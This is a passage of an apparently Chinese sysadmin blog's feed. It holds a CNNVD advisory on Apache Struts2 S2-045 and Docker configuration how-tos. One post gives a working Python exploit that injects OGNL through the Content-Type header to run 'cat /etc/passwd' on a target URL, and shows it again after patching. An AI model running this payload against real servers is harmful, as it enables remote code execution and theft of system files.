    <id>http://blog.unixmen.cn/2017/03/07/Struts-045-漏洞验证/</id>
    <published>2017-03-07T08:20:18.000Z</published>
    <updated>2017-03-08T01:18:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Struts-045-漏洞验证及漏洞修复后测试"><a href="#Struts-045-漏洞验证及漏洞修复后测试" class="headerlink" title="Struts-045-漏洞验证及漏洞修复后测试"></a>Struts-045-漏洞验证及漏洞修复后测试</h1><p> 接上篇<br>注：本脚本仅为Struts-045漏洞验证及研究，严谨从事任何非法恶意操作。</p>
<h2 id="一、脚本信息"><a href="#一、脚本信息" class="headerlink" title="一、脚本信息"></a>一、脚本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/env python</div><div class="line"># encoding:utf-8</div><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">from poster.encode import multipart_encode</div><div class="line">from poster.streaminghttp import register_openers</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def poc():</div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)&#125;)</div><div class="line">    header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;</div><div class="line">    header[&quot;Content-Type&quot;]=&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;cat /etc/passwd&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</div><div class="line">    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    print response.read()</div><div class="line"></div><div class="line"></div><div class="line">poc()</div></pre></td></tr></table></figure>
<h2 id="二、使用帮助"><a href="#二、使用帮助" class="headerlink" title="二、使用帮助"></a>二、使用帮助</h2><ul>
<li>将脚本命名为st-045.py</li>
<li>在工作目录创建 image1 和 tmp.txt两个空文件</li>
<li>执行 python st-045.py URL<br>如下图所示：<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc.png" alt=""><h2 id="三、漏洞修复后"><a href="#三、漏洞修复后" class="headerlink" title="三、漏洞修复后"></a>三、漏洞修复后</h2><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc_fixed.png" alt=""><br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/struts2_poc_fixed_1.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Struts-045-漏洞验证及漏洞修复后测试&quot;&gt;&lt;a href=&quot;#Struts-045-漏洞验证及漏洞修复后测试&quot; class=&quot;headerlink&quot; title=&quot;Struts-045-漏洞验证及漏洞修复后测试&quot;&gt;&lt;/a&gt;Struts-045-漏洞验证及漏
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://blog.unixmen.cn/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>关于Apache Struts2（S2-045）漏洞情况的通报</title>
    <link href="http://blog.unixmen.cn/2017/03/07/%E5%85%B3%E4%BA%8EApache-Struts2%EF%BC%88S2-045%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%83%85%E5%86%B5%E7%9A%84%E9%80%9A%E6%8A%A5/"/>
    <id>http://blog.unixmen.cn/2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/</id>
    <published>2017-03-07T07:28:49.000Z</published>
    <updated>2017-03-07T07:52:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>关于Apache Struts2 （S2-045）远程代码执行漏洞通报<br>近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（<a href="http://www.cnnvd.org.cn/vulnerability/show/cv_id/2017030152" target="_blank" rel="external">CNNVD-201703-152</a>）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下：</p>
<h1 id="一、-漏洞简介"><a href="#一、-漏洞简介" class="headerlink" title="一、 漏洞简介"></a>一、 漏洞简介</h1><p>Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。  </p>
<p>ApacheStruts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。    </p>
<h1 id="二、-漏洞危害"><a href="#二、-漏洞危害" class="headerlink" title="二、 漏洞危害"></a>二、 漏洞危害</h1><p>攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi ，debug等功能）以及启用任何插件，因此漏洞危害较为严重。</p>
<h1 id="三、-修复措施"><a href="#三、-修复措施" class="headerlink" title="三、 修复措施"></a>三、 修复措施</h1><p>目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。</p>
<ul>
<li>自查方式</li>
</ul>
<p>用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p>
<ul>
<li>升级修复</li>
</ul>
<p>受影响用户可升级版本至<a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32" target="_blank" rel="external">Apache Struts 2.3.32</a> 或 <a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1" target="_blank" rel="external">Apache Struts 2.5.10.1</a>以消除漏洞影响。</p>
<ul>
<li>临时缓解</li>
</ul>
<p>如用户不方便升级，可采取如下临时解决方案：</p>
<p> 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p>
<ul>
<li>相关链接<br>官方<a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="external">Aapache Struts2（S2-045）安全公告</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于Apache Struts2 （S2-045）远程代码执行漏洞通报&lt;br&gt;近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（&lt;a href=&quot;http://www.cnnvd.org.cn/vulnerabil
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://blog.unixmen.cn/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>广告拦截APP&quot;AdClear&quot; for 安卓/iOS</title>
    <link href="http://blog.unixmen.cn/2017/03/06/%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AAAPPADclear-for-%E5%AE%89%E5%8D%93-iOS/"/>
    <id>http://blog.unixmen.cn/2017/03/06/广告拦截APPADclear-for-安卓-iOS/</id>
    <published>2017-03-06T01:04:36.000Z</published>
    <updated>2017-03-06T06:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>良心广告拦截APP分享：<a href="http://seven-china.com/" target="_blank" rel="external">乐网</a>AdClear，视频APP无需会员过滤广告</p>
<ul>
<li>支持手机、平板</li>
<li>支持安卓、iOS</li>
<li>拦截系统内置广告</li>
<li>拦截视频软件广告</li>
<li>自身无广告</li>
<li>本地代理，建立VPN</li>
<li>无需root</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/adclear.png" alt=""></p>
<p>AppStore及安卓市场都可以搜到<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/adclearappstore.jpg" alt=""></p>
<p>从此观看视频一路畅通无阻。<br>Enjoy it！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;良心广告拦截APP分享：&lt;a href=&quot;http://seven-china.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;乐网&lt;/a&gt;AdClear，视频APP无需会员过滤广告&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持手机、平板&lt;/li&gt;
&lt;li&gt;支持
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
    
      <category term="手机APP" scheme="http://blog.unixmen.cn/tags/%E6%89%8B%E6%9C%BAAPP/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="广告拦截" scheme="http://blog.unixmen.cn/tags/%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AA/"/>
    
  </entry>
  
  <entry>
    <title>通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问</title>
    <link href="http://blog.unixmen.cn/2017/03/03/%E9%80%9A%E8%BF%87%E6%99%AF%E5%AE%89%E5%85%8D%E8%B4%B9%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0%E8%85%BE%E8%AE%AF%E5%85%8D%E8%B4%B9%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1%E7%BB%91%E5%AE%9A%E8%87%AA%E6%9C%89%E5%9F%9F%E5%90%8D%E7%99%BB%E9%99%86%E8%AE%BF%E9%97%AE/"/>
    <id>http://blog.unixmen.cn/2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/</id>
    <published>2017-03-03T03:53:41.000Z</published>
    <updated>2017-03-06T06:52:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段PHP代码即可。</p>
<p>由于一直用腾讯微信、QQ，所以就用了腾讯免费企业邮局，通过搜索了解到景安提供的有免费虚拟主机，所以就选择他了，，，，</p>
<p>准备工作：</p>
<ul>
<li>一个域名</li>
<li>已开通腾讯企业邮箱并设置正确解析</li>
<li>一个支持PHP的景安（免费）虚拟主机或者VPS</li>
</ul>
<h2 id="一、创建代码"><a href="#一、创建代码" class="headerlink" title="一、创建代码"></a>一、创建代码</h2><p>复制下面的代码，另存为index.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mail = file_get_contents(&quot;http://tel.exmail.qq.com/domain/mail.unixmen.cn&quot;);</div><div class="line">	echo $mail;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li>unixmen.cn 为开通腾讯企业邮箱时所用域名(请改为自己的顶级域名)</li>
<li>mail.unixmen.cn 为计划登陆访问时所用的域名</li>
</ul>
<h2 id="二、开通景安免费虚拟主机，绑定域名并解析"><a href="#二、开通景安免费虚拟主机，绑定域名并解析" class="headerlink" title="二、开通景安免费虚拟主机，绑定域名并解析"></a>二、开通<a href="http://www.zzidc.com/VirtualHost" target="_blank" rel="external">景安免费虚拟主机</a>，绑定域名并解析</h2><ul>
<li>开通主机<br>景安提供的有免费主机（下图左一）<br>建议：如果使用收费的虚拟主机，只做登陆邮箱调转试用，选个便宜的，够用就行，我选了一个最低配置（下图右一）一年才49，土豪请随意。</li>
</ul>
<hr>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_7.png" alt=""></p>
<hr>
<p>考虑到虚拟主机还有其他用途，索性就买了个收费的业务。</p>
<hr>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_3.png" alt=""></h2><p>注：无论是收费主机还是免费主机，以下操作或功能上没有区别。</p>
<ul>
<li>添加域名绑定<br>景安的虚拟主机如果不添加域名绑定，即便是解析正确，也无法访问，这个略屌。</li>
</ul>
<hr>
<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_9.png" alt=""></h2><ul>
<li>添加解析</li>
</ul>
<h2 id="添加MX记录及添加CNAME解析到景安提供的三级域名。"><a href="#添加MX记录及添加CNAME解析到景安提供的三级域名。" class="headerlink" title="添加MX记录及添加CNAME解析到景安提供的三级域名。"></a>添加MX记录及添加CNAME解析到景安提供的三级域名。</h2><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_5.png" alt=""></p>
<ul>
<li>解析生效</li>
</ul>
<hr>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_6.png" alt=""></p>
<h2 id="三、上传脚本程序"><a href="#三、上传脚本程序" class="headerlink" title="三、上传脚本程序"></a>三、上传脚本程序</h2><p>使用FTP工具或者文件管理器将步骤一中创建的index.php文件上传到WEB文件夹中</p>
<hr>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_8.png" alt=""></p>
<h2 id="四、测试访问"><a href="#四、测试访问" class="headerlink" title="四、测试访问"></a>四、测试访问</h2><p>如果上面的操作都没有错误的情况下，最后便可输入您的域名进行测试访问了，比如：mail.unixmen.cn<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gavhost_2.png" alt=""></p>
<h2 id="五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。"><a href="#五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。" class="headerlink" title="五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。"></a>五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段P
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
    
      <category term="其他" scheme="http://blog.unixmen.cn/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Docker 私有仓库无法上传镜像的问题</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker-%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E6%97%A0%E6%B3%95%E4%B8%8A%E4%BC%A0%E9%95%9C%E5%83%8F%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker-私有仓库无法上传镜像的问题/</id>
    <published>2017-03-02T09:08:16.000Z</published>
    <updated>2017-03-29T00:41:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图：</p>
<ul>
<li>无法push镜像</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403.png" alt=""></p>
<ul>
<li>无法pull镜像</li>
</ul>
<p> <img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403_2.png" alt=""></p>
<p><strong>导致原因：</strong><br>因为启动的registry服务不是安全可信赖的</p>
<p><strong> 解决方法如下：</strong></p>
<ul>
<li><p>CentOS 6</p>
<ul>
<li><p>修改docker的配置文件/etc/default/docker，添加下面的内容，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DOCKER_OPTS=&quot;--insecure-registry xxx.xxx.xxx.xxx:5000&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>重启docker服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service docker restart</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>CentOS 7</p>
<ul>
<li><p>创建或修改 /etc/docker/daemon.json 文件，添加如下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  &quot;insecure-registries&quot;: [&quot;xxx.xxx.xxx.xxx:5000&quot;]</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
</li>
<li><p>重启Docker 服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart docker</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>测试：</p>
<ul>
<li>push 测试 </li>
</ul>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403_1.png" alt=""></p>
<ul>
<li>pull 测试</li>
</ul>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/dockertb403_3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无法push镜像&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuserconten
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Trouble shooting" scheme="http://blog.unixmen.cn/tags/Trouble-shooting/"/>
    
  </entry>
  
  <entry>
    <title>Docker配置Daocloud加速器</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker%E9%85%8D%E7%BD%AEDaocloud%E5%8A%A0%E9%80%9F%E5%99%A8/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker配置Daocloud加速器/</id>
    <published>2017-03-02T07:12:31.000Z</published>
    <updated>2017-03-29T00:40:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>Docker 版本在 1.12 或更高<br>创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）<br><a href="https://www.daocloud.io/mirror#accelerator-doc" target="_blank" rel="external">Daocloud加速器地址</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &quot;registry-mirrors&quot;: [</div><div class="line">        &quot;加速地址&quot;</div><div class="line">    ],</div><div class="line">    &quot;insecure-registries&quot;: []</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker 版本在 1.12 或更高&lt;br&gt;创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）&lt;br&gt;&lt;a href=&quot;https://www.daocloud.io/mirror#acc
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Docker配置HTTP代理</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker%E9%85%8D%E7%BD%AEHTTP%E4%BB%A3%E7%90%86/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker配置HTTP代理/</id>
    <published>2017-03-02T07:11:24.000Z</published>
    <updated>2017-03-29T00:42:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图：</p>
<p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_no_proxy.png" alt=""></p>
<p>CentOS 6下配置docker 的https_proxy 代理,只需要在/etc/sysconfig/docker 配置文件里面增加配置即可。</p>
<p>CentOS 7 无法使用这样的配置方式进行https_proxy 配置，原因为CentOS 7 使用systemd 来管理进程,我们需要添加https_proxy进行配置，步骤如下：</p>
<ul>
<li>创建目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /etc/systemd/system/docker.service.d</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>添加配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">echo &quot;[Service]</div><div class="line">Environment=&quot;HTTP_PROXY=http://proxy.ip.com:80&quot;&quot;|tee /etc/systemd/system/docker.service.d/http-proxy.conf</div></pre></td></tr></table></figure>
</li>
<li><p>Reload systemd-daemon</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">systemctl daemon-reload</div></pre></td></tr></table></figure>
</li>
<li><p>重启docker服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart docker</div></pre></td></tr></table></figure>
</li>
<li><p>检查变量是否加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl show docker --property Environment</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>测试是否生效<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_proxy_1.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_no_proxy.p
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>Docker修改默认存储位置</title>
    <link href="http://blog.unixmen.cn/2017/03/02/Docker%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE/"/>
    <id>http://blog.unixmen.cn/2017/03/02/Docker修改默认存储位置/</id>
    <published>2017-03-02T07:10:23.000Z</published>
    <updated>2017-03-29T00:41:49.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>停止docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl stop docker</div></pre></td></tr></table></figure>
</li>
<li><p>备份默认docker存储数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mv /var/lib/docker&#123;,.bak&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>创建docker数据存放文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /data/docker</div></pre></td></tr></table></figure>
</li>
<li><p>创建软连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s /data/docker/ /var/lib/docker</div></pre></td></tr></table></figure>
</li>
<li><p>启动docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start docker</div></pre></td></tr></table></figure>
</li>
<li><p>查看存储位置<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/docker_root.png" alt=""></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;停止docker&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;c
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>How to Install Docker Engine on CentOS 7.</title>
    <link href="http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/"/>
